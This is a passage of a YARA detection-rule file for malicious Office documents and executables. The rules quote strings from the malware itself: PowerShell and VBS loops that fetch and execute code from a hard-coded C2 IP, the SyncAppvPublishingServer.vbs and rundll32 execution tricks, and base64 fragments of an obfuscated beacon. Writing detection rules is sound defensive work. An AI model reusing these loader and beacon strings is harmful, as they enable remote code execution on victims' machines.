      $s5 = "SystemWebProxy();$w.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.11.4" ascii
      $s6 = "http://canarytokens.com/tags/traffic/images/azp6ai8pg5aq0c619ur0qzi6h/post.jsp" fullword wide
      $s7 = "472.124 Safari/537.36|'+ $env:username;$w.timeout=40000;$r='';$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponse" ascii
      $s8 = "rundll32.exe pcwutl.dll,LaunchApplication  " fullword ascii
      $s9 = "rundll32.exe pcwutl.dll,LaunchApplication " fullword wide
      $s10 = "serName + \"\\links\\links.ps1\" , 0, True" fullword ascii
      $s11 = "\\Links\\gKN.vbs" fullword wide
      $s12 = "Stream())).ReadToEnd();&(\"{1}{2}{0}\" -f 'X','I','E') $r;}catch{}}" fullword ascii
      $s13 = "llehS*tpircSW" fullword wide
      $s14 = "RegWrite" fullword wide
      $s15 = "undll32." fullword ascii
      $s16 = "pircSW\") , \"*\"" fullword ascii
      $s17 = "unction " fullword ascii
      $s18 = "        }" fullword ascii /* reversed goodware string '}        ' */
      $s19 = "zEyeY$" fullword ascii
      $s20 = "Aurelia" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d {
   meta:
      description = "data - file b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d"
   strings:
      $x1 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x2 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x3 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s4 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s5 = "SystemWebProxy();$w.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.11.4" ascii
      $s6 = "http://canarytokens.com/tags/traffic/images/azp6ai8pg5aq0c619ur0qzi6h/post.jsp" fullword wide
      $s7 = "472.124 Safari/537.36|'+ $env:username;$w.timeout=40000;$r='';$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponse" ascii
      $s8 = "rundll32.exe pcwutl.dll,LaunchApplication  " fullword ascii
      $s9 = "rundll32.exe pcwutl.dll,LaunchApplication " fullword wide
      $s10 = "41435E6662666266626662" ascii /* hex encoded string 'AC^fbfbfbfb' */
      $s11 = "serName + \"\\links\\links.ps1\" , 0, True" fullword ascii
      $s12 = "\\Links\\gKN.vbs" fullword wide
      $s13 = "Stream())).ReadToEnd();&(\"{1}{2}{0}\" -f 'X','I','E') $r;}catch{}}" fullword ascii
      $s14 = "===EEE" fullword ascii /* reversed goodware string 'EEE===' */
      $s15 = "llehS*tpircSW" fullword wide
      $s16 = "RegWrite" fullword wide
      $s17 = "undll32." fullword ascii
      $s18 = "pircSW\") , \"*\"" fullword ascii
      $s19 = "unction " fullword ascii
      $s20 = "        }" fullword ascii /* reversed goodware string '}        ' */
   condition:
      uint16(0) == 0xcfd0 and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d_2 {
   meta:
      description = "data - file b726f4dd745891070f2e516d5d4e4f2f1ce0bf3ff685dc3800455383f342e54d.xls"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "8908f8f4a9e4a6f28857396ff9f73c98e97a41382ecc5a24f4a2a37431989152"
   strings:
      $x1 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x2 = "Set oili = CreateObject (\"WScript.Shell\"):oili.run \"powershell -exec bypass -file c:\\users\\\" + CreateObject(\"WScript.Netw" ascii
      $x3 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s4 = "for ($i=2; $i -gt 1; $i++) {try{$w=[System.Net.HttpWebRequest]::Create('http://185.118.167.120/');$w.proxy=[Net.WebRequest]::Get" ascii
      $s5 = "SystemWebProxy();$w.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.11.4" ascii
      $s6 = "http://canarytokens.com/tags/traffic/images/azp6ai8pg5aq0c619ur0qzi6h/post.jsp" fullword wide
      $s7 = "472.124 Safari/537.36|'+ $env:username;$w.timeout=40000;$r='';$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponse" ascii
      $s8 = "rundll32.exe pcwutl.dll,LaunchApplication  " fullword ascii
      $s9 = "rundll32.exe pcwutl.dll,LaunchApplication " fullword wide
      $s10 = "41435E6662666266626662" ascii /* hex encoded string 'AC^fbfbfbfb' */
      $s11 = "serName + \"\\links\\links.ps1\" , 0, True" fullword ascii
      $s12 = "\\Links\\gKN.vbs" fullword wide
      $s13 = "Stream())).ReadToEnd();&(\"{1}{2}{0}\" -f 'X','I','E') $r;}catch{}}" fullword ascii
      $s14 = "===EEE" fullword ascii /* reversed goodware string 'EEE===' */
      $s15 = "llehS*tpircSW" fullword wide
      $s16 = "RegWrite" fullword wide
      $s17 = "undll32." fullword ascii
      $s18 = "pircSW\") , \"*\"" fullword ascii
      $s19 = "unction " fullword ascii
      $s20 = "        }" fullword ascii /* reversed goodware string '}        ' */
   condition:
      uint16(0) == 0xcfd0 and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule sig_450302fb71d8e0e30c80f19cfe7fb7801b223754698cac0997eb3a3c8e440a48 {
   meta:
      description = "data - file 450302fb71d8e0e30c80f19cfe7fb7801b223754698cac0997eb3a3c8e440a48.exe"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "450302fb71d8e0e30c80f19cfe7fb7801b223754698cac0997eb3a3c8e440a48"
   strings:
      $x1 = "C:\\Windows\\System32\\SyncAppvPublishingServer.vbs \"n;.('{2}{0}{1}' -f[string][char][int]101,[string][char][int]88,'i')((.('{2" wide
      $x2 = "C:\\Users\\Root\\source\\repos\\Generated_pwn_doc_Zero\\Release\\Generated_pwn_doc_Zero.pdb" fullword ascii
      $s3 = "SkV4bGRFMWxVbWxrWlNBOUlGdFRlWE4wWlcwdVZHVjRkQzVGYm1OdlpHbHVaMTA2T2xWVVJqZ05DaVJCY21sbllYUnZJRDBnSWtsUmIxbERRVGhGUkd0c1IxSldiRTFV" ascii /* base64 encoded string 'JExldE1lUmlkZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgNCiRBcmlnYXRvID0gIklRb1lDQThFRGtsR1JWbE1UVHBRVWxOUEtob0ZIQlJGR2xsVk4xbFNTRXNiR2w5YlVrMVlSa1kwRGdvSENrMVRVMWxmVmtKWldFd2pDeE1HRGdBZVhGSmFRbFVlIg0KJEFyaWdhdG8gPSAkTGV0TWVSaWRlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRBcmlnYXRvKSkNCg0KJExhYmlhbWEgPSAkTGV0TWVSaWRlLkdldEJ5dGVzKCRBcmlnYXRvKQ0KCSROYW55ID0gJExldE1lUmlkZS5HZXRCeXRlcygibGViYWNob2Zza2kiKQ0KICAgICROYW5hID0gJChmb3IgKCRpID0gMDsgJGkgLWx0ICRMYWJpYW1hLmxlbmd0aDsgKSB7DQogICAgICAgIGZvciAoJGogPSAwOyAkaiAtbHQgJE5hbnkubGVuZ3RoOyAkaisrKSB7DQogICAgICAgICAgICAkTGFiaWFtYVskaV0gLWJ4b3IgJE5hbnlbJGpdDQogICAgICAgICAgICAkaSsrDQogICAgICAgICAgICBpZiAoJGkgLWdlICRMYWJpYW1hLkxlbmd0aCkgew0KICAgICAgICAgICAgICAgICRqID0gJE5hbnkubGVuZ3RoDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9KQ0KCSROYW5hID0gJExldE1lUmlkZS5HZXRTdHJpbmcoJE5hbmEpDQoJDQpmb3IgKCRpPTI7ICRpIC1ndCAxOyAkaSsrKSB7DQp0cnl7DQokdz1bU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF06OkNyZWF0ZSgiaCIrInQiKyJ0cDoiKyJcXCIrIjI1MTMxMDU0OTIiKyI6NDQzIik7DQokdy5wcm94eT1bTmV0LldlYlJlcXVlc3RdOjpHZXRTeXN0ZW1XZWJQcm94eSgpOw0KJHcuVXNlckFnZW50ID0gJE5hbmEuVG9TdHJpbmcoKSArICRlbnY6dXNlcm5hbWUNCiR3LnRpbWVvdXQ9NDAwMDA7DQokcj0nJzskcj0oTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKCR3LkdldFJlc3BvbnNlKCkuR2V0UmVzcG9uc2VTdHJlYW0oKSkpLlJlYWRUb0VuZCgpOw0KJigiezF9ezJ9ezB9IiAtZiAnWCcsJ0knLCdFJykgJHI7DQp9Y2F0Y2h7fQ0KfQ==' */
      $s4 = "VW1WemNHOXVjMlZUZEhKbFlXMG9LU2twTGxKbFlXUlViMFZ1WkNncE93MEtKaWdpZXpGOWV6SjllekI5SWlBdFppQW5XQ2NzSjBrbkxDZEZKeWtnSkhJN0RRcDlZMkYw" ascii /* base64 encoded string 'UmVzcG9uc2VTdHJlYW0oKSkpLlJlYWRUb0VuZCgpOw0KJigiezF9ezJ9ezB9IiAtZiAnWCcsJ0knLCdFJykgJHI7DQp9Y2F0' */
      $s5 = "S0NSQmNtbG5ZWFJ2S1NrTkNnMEtKRXhoWW1saGJXRWdQU0FrVEdWMFRXVlNhV1JsTGtkbGRFSjVkR1Z6S0NSQmNtbG5ZWFJ2S1EwS0NTUk9ZVzU1SUQwZ0pFeGxkRTFs" ascii /* base64 encoded string 'KCRBcmlnYXRvKSkNCg0KJExhYmlhbWEgPSAkTGV0TWVSaWRlLkdldEJ5dGVzKCRBcmlnYXRvKQ0KCSROYW55ID0gJExldE1l' */
      $s6 = "LignezJ9ezB9ezF9JyAtZltzdHJpbmddW2NoYXJdW2ludF0xMDEsW3N0cmluZ11bY2hhcl1baW50XTg4LCdpJykoJyRzYTYgPSAiKFtTeXN0ZW0uVCIgKyAiZXh0LkVu" ascii /* base64 encoded string '.('{2}{0}{1}' -f[string][char][int]101,[string][char][int]88,'i')('$sa6 = "([System.T" + "ext.En' */
      $s7 = "WldKUWNtOTRlU2dwT3cwS0pIY3VWWE5sY2tGblpXNTBJRDBnSkU1aGJtRXVWRzlUZEhKcGJtY29LU0FySUNSbGJuWTZkWE5sY201aGJXVU5DaVIzTG5ScGJXVnZkWFE5" ascii /* base64 encoded string 'ZWJQcm94eSgpOw0KJHcuVXNlckFnZW50ID0gJE5hbmEuVG9TdHJpbmcoKSArICRlbnY6dXNlcm5hbWUNCiR3LnRpbWVvdXQ9' */
      $s8 = "TG14bGJtZDBhRHNnS1NCN0RRb2dJQ0FnSUNBZ0lHWnZjaUFvSkdvZ1BTQXdPeUFrYWlBdGJIUWdKRTVoYm5rdWJHVnVaM1JvT3lBa2Fpc3JLU0I3RFFvZ0lDQWdJQ0Fn" ascii /* base64 encoded string 'Lmxlbmd0aDsgKSB7DQogICAgICAgIGZvciAoJGogPSAwOyAkaiAtbHQgJE5hbnkubGVuZ3RoOyAkaisrKSB7DQogICAgICAg' */
      $s9 = "Y29kIiArICJpbmddOjpVVEY4LkdldFMiOyAkRzByYiA9ICJ0cmluZyhbU3kiICsgInN0ZW0uQ29udmUiICsgInJ0XTo6RnJvbUJhIjsgJHpvcjkgPSAic2U2IiArICI0" ascii /* base64 encoded string 'cod" + "ing]::UTF8.GetS"; $G0rb = "tring([Sy" + "stem.Conve" + "rt]::FromBa"; $zor9 = "se6" + "4' */
      $s10 = "VkhCUlZXeE9VRXRvYjBaSVFsSkdSMnhzVms0eGJGTlRSWE5pUjJ3NVlsVnJNVmxTYTFrd1JHZHZTRU5yTVZSVk1XeG1WbXRLV2xkRmQycERlRTFIUkdkQlpWaEdTbUZS" ascii /* base64 encoded string 'VHBRVWxOUEtob0ZIQlJGR2xsVk4xbFNTRXNiR2w5YlVrMVlSa1kwRGdvSENrMVRVMWxmVmtKWldFd2pDeE1HRGdBZVhGSmFR' */
      $s11 = "ICR6b3I5OyAkb2hzaGl0ID0gJEZhcnQgLUpvaW4gIiI7LigiezJ9ezB9ezF9IiAtZltzdHJpbmddW2NoYXJdW2ludF0xMDEsW3N0cmluZ11bY2hhcl1baW50XTg4LCJp" ascii /* base64 encoded string ' $zor9; $ohshit = $Fart -Join "";.("{2}{0}{1}" -f[string][char][int]101,[string][char][int]88,"i' */
      $s12 = "SkV4bGRFMWxVbWxrWlNBOUlGdFRlWE4wWlcwdVZHVjRkQzVGYm1OdlpHbHVaMTA2T2xWVVJqZ05DaVJCY21sbllYUnZJRDBnSWtsUmIxbERRVGhGUkd0c1IxSldiRTFV" ascii /* base64 encoded string 'JExldE1lUmlkZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgNCiRBcmlnYXRvID0gIklRb1lDQThFRGtsR1JWbE1U' */
      $s13 = "YkZWbElnMEtKRUZ5YVdkaGRHOGdQU0FrVEdWMFRXVlNhV1JsTGtkbGRGTjBjbWx1WnloYlUzbHpkR1Z0TGtOdmJuWmxjblJkT2pwR2NtOXRRbUZ6WlRZMFUzUnlhVzVu" ascii /* base64 encoded string 'bFVlIg0KJEFyaWdhdG8gPSAkTGV0TWVSaWRlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5n' */
      $s14 = "RFFvZ0lDQWdJQ0FnSUgwTkNpQWdJQ0I5S1EwS0NTUk9ZVzVoSUQwZ0pFeGxkRTFsVW1sa1pTNUhaWFJUZEhKcGJtY29KRTVoYm1FcERRb0pEUXBtYjNJZ0tDUnBQVEk3" ascii /* base64 encoded string 'DQogICAgICAgIH0NCiAgICB9KQ0KCSROYW5hID0gJExldE1lUmlkZS5HZXRTdHJpbmcoJE5hbmEpDQoJDQpmb3IgKCRpPTI7' */
      $s15 = "S3lKMGNEb2lLeUpjWENJcklqSTFNVE14TURVME9USWlLeUk2TkRReklpazdEUW9rZHk1d2NtOTRlVDFiVG1WMExsZGxZbEpsY1hWbGMzUmRPanBIWlhSVGVYTjBaVzFY" ascii /* base64 encoded string 'KyJ0cDoiKyJcXCIrIjI1MTMxMDU0OTIiKyI6NDQzIik7DQokdy5wcm94eT1bTmV0LldlYlJlcXVlc3RdOjpHZXRTeXN0ZW1X' */
      $s16 = "SUNScElDMW5kQ0F4T3lBa2FTc3JLU0I3RFFwMGNubDdEUW9rZHoxYlUzbHpkR1Z0TGs1bGRDNUlkSFJ3VjJWaVVtVnhkV1Z6ZEYwNk9rTnlaV0YwWlNnaWFDSXJJblFp" ascii /* base64 encoded string 'ICRpIC1ndCAxOyAkaSsrKSB7DQp0cnl7DQokdz1bU3lzdGVtLk5ldC5IdHRwV2ViUmVxdWVzdF06OkNyZWF0ZSgiaCIrInQi' */
      $s17 = "VW1sa1pTNUhaWFJDZVhSbGN5Z2liR1ZpWVdOb2IyWnphMmtpS1EwS0lDQWdJQ1JPWVc1aElEMGdKQ2htYjNJZ0tDUnBJRDBnTURzZ0pHa2dMV3gwSUNSTVlXSnBZVzFo" ascii /* base64 encoded string 'UmlkZS5HZXRCeXRlcygibGViYWNob2Zza2kiKQ0KICAgICROYW5hID0gJChmb3IgKCRpID0gMDsgJGkgLWx0ICRMYWJpYW1h' */
      $s18 = "TkRBd01EQTdEUW9rY2owbkp6c2tjajBvVG1WM0xVOWlhbVZqZENCVGVYTjBaVzB1U1U4dVUzUnlaV0Z0VW1WaFpHVnlLQ1IzTGtkbGRGSmxjM0J2Ym5ObEtDa3VSMlYw" ascii /* base64 encoded string 'NDAwMDA7DQokcj0nJzskcj0oTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKCR3LkdldFJlc3BvbnNlKCkuR2V0' */
      $s19 = "TFdkbElDUk1ZV0pwWVcxaExreGxibWQwYUNrZ2V3MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDUnFJRDBnSkU1aGJua3ViR1Z1WjNSb0RRb2dJQ0FnSUNBZ0lDQWdJQ0I5" ascii /* base64 encoded string 'LWdlICRMYWJpYW1hLkxlbmd0aCkgew0KICAgICAgICAgICAgICAgICRqID0gJE5hbnkubGVuZ3RoDQogICAgICAgICAgICB9' */
      $s20 = "SUNBZ0lDQWtUR0ZpYVdGdFlWc2thVjBnTFdKNGIzSWdKRTVoYm5sYkpHcGREUW9nSUNBZ0lDQWdJQ0FnSUNBa2FTc3JEUW9nSUNBZ0lDQWdJQ0FnSUNCcFppQW9KR2tn" ascii /* base64 encoded string 'ICAgICAkTGFiaWFtYVskaV0gLWJ4b3IgJE5hbnlbJGpdDQogICAgICAgICAgICAkaSsrDQogICAgICAgICAgICBpZiAoJGkg' */
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule sig_7dc49601fa6485c3a2cb1d519794bee004fb7fc0f3b37394a1aef6fceefec0c8 {
   meta:
      description = "data - file 7dc49601fa6485c3a2cb1d519794bee004fb7fc0f3b37394a1aef6fceefec0c8.exe"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "7dc49601fa6485c3a2cb1d519794bee004fb7fc0f3b37394a1aef6fceefec0c8"
   strings:
      $x1 = "C:\\Windows\\System32\\SyncAppvPublishingServer.vbs \"n;.('{2}{0}{1}' -f[string][char][int]101,[string][char][int]88,'i')([Syste" wide
      $x2 = "C:\\Users\\Root\\source\\repos\\Hex_Pwn_v0\\Release\\Hex_Pwn_v0.pdb" fullword ascii
      $s3 = "WkNnaVFXTmpaWEIwTFVWdVkyOWthVzVuSWl3Z0ltbGtaVzUwYVhSNUlpazdEUW9nSUNBZ0lDQWdJQ0FnSUNBa2NtVnpjQ0E5SUNSeUxrZGxkRkpsYzNCdmJuTmxLQ2tO" ascii /* base64 encoded string 'ZCgiQWNjZXB0LUVuY29kaW5nIiwgImlkZW50aXR5Iik7DQogICAgICAgICAgICAkcmVzcCA9ICRyLkdldFJlc3BvbnNlKCkN' */
      $s4 = "WlNncERRb2dJQ0FnSUNBZ0lDUnlaWEZ6ZEhKbFlXMGdQU0FrY21WemNDNUhaWFJTWlhOd2IyNXpaVk4wY21WaGJTZ3BEUW9nSUNBZ0lDQWdJQ1J6Y2lBOUlFNWxkeTFQ" ascii /* base64 encoded string 'ZSgpDQogICAgICAgICRyZXFzdHJlYW0gPSAkcmVzcC5HZXRSZXNwb25zZVN0cmVhbSgpDQogICAgICAgICRzciA9IE5ldy1P' */
      $s5 = "SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBa1VsVk9JRDBnSkY4Z2ZDQnZkWFF0YzNSeWFXNW5EUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdmUTBLSUNBZ0lDQWdJQ0Fn" ascii /* base64 encoded string 'ICAgICAgICAgICAgICAgICAgICAkUlVOID0gJF8gfCBvdXQtc3RyaW5nDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAg' */
      $s6 = "WTI5a2FXNW5YVG82VlZSR09DNUhaWFJDZVhSbGN5Z2tkVzVsYm1OeWVYQjBaV1JUZEhKcGJtY3BEUW9nSUNBZ0pHRmxjMDFoYm1GblpXUWdQU0JEUVUxUElDUnJaWGtO" ascii /* base64 encoded string 'Y29kaW5nXTo6VVRGOC5HZXRCeXRlcygkdW5lbmNyeXB0ZWRTdHJpbmcpDQogICAgJGFlc01hbmFnZWQgPSBDQU1PICRrZXkN' */
      $s7 = "TGtOdmJuWmxjblJkT2pwVWIwSmhjMlUyTkZOMGNtbHVaeWdrY3lrTkNpQWdJQ0FnSUNBZ0lDQWdJQ1JWVWtrZ1BTQWlhSFIwY0Rvdkx6RTROUzR4TVRndU1UWTBMakUy" ascii /* base64 encoded string 'LkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkcykNCiAgICAgICAgICAgICRVUkkgPSAiaHR0cDovLzE4NS4xMTguMTY0LjE2' */
      $s8 = "Q2lBZ0lDQWtaVzVqY25sd2RHOXlJRDBnSkdGbGMwMWhibUZuWldRdVEzSmxZWFJsUlc1amNubHdkRzl5S0NrTkNpQWdJQ0FrWlc1amNubHdkR1ZrUkdGMFlTQTlJQ1Js" ascii /* base64 encoded string 'CiAgICAkZW5jcnlwdG9yID0gJGFlc01hbmFnZWQuQ3JlYXRlRW5jcnlwdG9yKCkNCiAgICAkZW5jcnlwdGVkRGF0YSA9ICRl' */
      $s9 = "VTNsemRHVnRMbFJsZUhRdVJXNWpiMlJwYm1kZE9qcFZWRVk0TGtkbGRFSjVkR1Z6S0NSVFJVNUVLUTBLSUNBZ0lDQWdJQ0FnSUNBZ0pGTkZUa1FnUFNCYlUzbHpkR1Z0" ascii /* base64 encoded string 'U3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRTRU5EKQ0KICAgICAgICAgICAgJFNFTkQgPSBbU3lzdGVt' */
      $s10 = "Ykc5amF5Z2tZbmwwWlhNc0lERTJMQ0FrWW5sMFpYTXVUR1Z1WjNSb0lDMGdNVFlwT3cwS0lDQWdJRnRUZVhOMFpXMHVWR1Y0ZEM1RmJtTnZaR2x1WjEwNk9sVlVSamd1" ascii /* base64 encoded string 'bG9jaygkYnl0ZXMsIDE2LCAkYnl0ZXMuTGVuZ3RoIC0gMTYpOw0KICAgIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgu' */
      $s11 = "TGxKbFlXUlViMFZ1WkNncElDMXpjR3hwZENnaVlHNGlLU0I4SUZObGJHVmpkQzFUZEhKcGJtY2dJandoTFMwZ0pGTlVWVUlpRFFvZ0lDQWdJQ0FnSUNSRlRrTlNXVkJV" ascii /* base64 encoded string 'LlJlYWRUb0VuZCgpIC1zcGxpdCgiYG4iKSB8IFNlbGVjdC1TdHJpbmcgIjwhLS0gJFNUVUIiDQogICAgICAgICRFTkNSWVBU' */
      $s12 = "UVdkbGJuUWdQU0FpUjI5dloyeGxZbTkwTHpJdU1TQW9LMmgwZEhBNkx5OTNkM2N1WjI5dloyeGxMbU52YlM5aWIzUXVhSFJ0YkNraURRb2dJQ0FnSUNBZ0lDUnlMa2hs" ascii /* base64 encoded string 'QWdlbnQgPSAiR29vZ2xlYm90LzIuMSAoK2h0dHA6Ly93d3cuZ29vZ2xlLmNvbS9ib3QuaHRtbCkiDQogICAgICAgICRyLkhl' */
      $s13 = "UjBWVUlnMEtJQ0FnSUNBZ0lDQWdJQ0FnSkhJdVMyVmxjRUZzYVhabElEMGdKR1poYkhObERRb2dJQ0FnSUNBZ0lDQWdJQ0FrY2k1VmMyVnlRV2RsYm5RZ1BTQWlSMjl2" ascii /* base64 encoded string 'R0VUIg0KICAgICAgICAgICAgJHIuS2VlcEFsaXZlID0gJGZhbHNlDQogICAgICAgICAgICAkci5Vc2VyQWdlbnQgPSAiR29v' */
      $s14 = "TkZOMGNtbHVaeWdrU1ZZcERRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdaV3h6WlNCN0RRb2dJQ0FnSUNBZ0lDQWdJQ0FrWVdWelRXRnVZV2RsWkM1SlZpQTlJQ1JK" ascii /* base64 encoded string 'NFN0cmluZygkSVYpDQogICAgICAgIH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAkYWVzTWFuYWdlZC5JViA9ICRJ' */
      $s15 = "YVc1aGJDQTlJRnRUZVhOMFpXMHVRMjl1ZG1WeWRGMDZPbFJ2UW1GelpUWTBVM1J5YVc1bktDUm9ZWE5vUW5sMFpYTXBEUW9nSUNBZ2NtVjBkWEp1SUNSbWFXNWhiQTBL" ascii /* base64 encoded string 'aW5hbCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRoYXNoQnl0ZXMpDQogICAgcmV0dXJuICRmaW5hbA0K' */
      $s16 = "ZVhCMGIyZHlZWEJvZVM1UVlXUmthVzVuVFc5a1pWMDZPbEJMUTFNM0RRb2dJQ0FnSkdGbGMwMWhibUZuWldRdVFteHZZMnRUYVhwbElEMGdNVEk0RFFvZ0lDQWdKR0Zs" ascii /* base64 encoded string 'eXB0b2dyYXBoeS5QYWRkaW5nTW9kZV06OlBLQ1M3DQogICAgJGFlc01hbmFnZWQuQmxvY2tTaXplID0gMTI4DQogICAgJGFl' */
      $s17 = "SUNBZ0lDQWdJQ1J5TGsxbGRHaHZaQ0E5SUNKSFJWUWlEUW9nSUNBZ0lDQWdJQ1J5TGt0bFpYQkJiR2wyWlNBOUlDUm1ZV3h6WlEwS0lDQWdJQ0FnSUNBa2NpNVZjMlZ5" ascii /* base64 encoded string 'ICAgICAgICRyLk1ldGhvZCA9ICJHRVQiDQogICAgICAgICRyLktlZXBBbGl2ZSA9ICRmYWxzZQ0KICAgICAgICAkci5Vc2Vy' */
      $s18 = "WVdSbGNuTXVRV1JrS0NKQlkyTmxjSFF0Ulc1amIyUnBibWNpTENBaWFXUmxiblJwZEhraUtUc05DaUFnSUNBZ0lDQWdKSEpsYzNBZ1BTQWtjaTVIWlhSU1pYTndiMjV6" ascii /* base64 encoded string 'YWRlcnMuQWRkKCJBY2NlcHQtRW5jb2RpbmciLCAiaWRlbnRpdHkiKTsNCiAgICAgICAgJHJlc3AgPSAkci5HZXRSZXNwb25z' */
      $s19 = "SUNBZ0lDQWdJQ0FrY2k1RGIyOXJhV1ZEYjI1MFlXbHVaWElnUFNBa1kyOXZhMmxsWTI5dWRHRnBibVZ5RFFvZ0lDQWdJQ0FnSUNBZ0lDQWtjaTVOWlhSb2IyUWdQU0Fp" ascii /* base64 encoded string 'ICAgICAgICAkci5Db29raWVDb250YWluZXIgPSAkY29va2llY29udGFpbmVyDQogICAgICAgICAgICAkci5NZXRob2QgPSAi' */
      $s20 = "RFFvZ0lDQWdJQ0FnSUhOc1pXVndJQ1IwYVcxbERRb2dJQ0FnSUNBZ0lHTnZibTVsWTNSdmNnMEtJQ0FnSUNBZ0lDQkRiMjUwYVc1MVpRMEtJQ0FnSUgwTkNuMD0=" fullword ascii /* base64 encoded string 'DQogICAgICAgIHNsZWVwICR0aW1lDQogICAgICAgIGNvbm5lY3Rvcg0KICAgICAgICBDb250aW51ZQ0KICAgIH0NCn0=' */
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb91d285 {
   meta:
      description = "data - file f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb91d285.exe"
      author = "Arda Büyükkaya"
      reference = "Internal Research"
      date = "2022-02-02"
      hash1 = "f6569039513e261ba9c70640e6eb8f59a0c72471889d3c0eaba51bdebb91d285"
   strings:
      $x1 = "C:\\Windows\\System32\\SyncAppvPublishingServer.vbs \"n;.('{2}{0}{1}' -f[string][char][int]101,[string][char][int]88,'i')([Syste" wide
      $x2 = "C:\\Users\\Root\\source\\repos\\Doc_PwnHex_ah\\Release\\Doc_PwnHex_ah.pdb" fullword ascii
      $s3 = "VTFSVlFpSXBEUW9nSUNBZ0lDQWdJQ1JGVGtOU1dWQlVSVVFnUFNBa1JVNURVbGxRVkVWRVd6RmRJQzF6Y0d4cGRDZ2lJQzB0UGp3dlltOWtlVDRpS1EwS0lDQWdJQ0Fn" ascii /* base64 encoded string 'U1RVQiIpDQogICAgICAgICRFTkNSWVBURUQgPSAkRU5DUllQVEVEWzFdIC1zcGxpdCgiIC0tPjwvYm9keT4iKQ0KICAgICAg' */
      $s4 = "SUNBZ0lDQWdJQ0FnSUNBZ0pISXVWWE5sY2tGblpXNTBJRDBnSWtkdmIyZHNaV0p2ZEM4eUxqRWdLQ3RvZEhSd09pOHZkM2QzTG1kdmIyZHNaUzVqYjIwdlltOTBMbWgw" ascii /* base64 encoded string 'ICAgICAgICAgICAgJHIuVXNlckFnZW50ID0gIkdvb2dsZWJvdC8yLjEgKCtodHRwOi8vd3d3Lmdvb2dsZS5jb20vYm90Lmh0' */
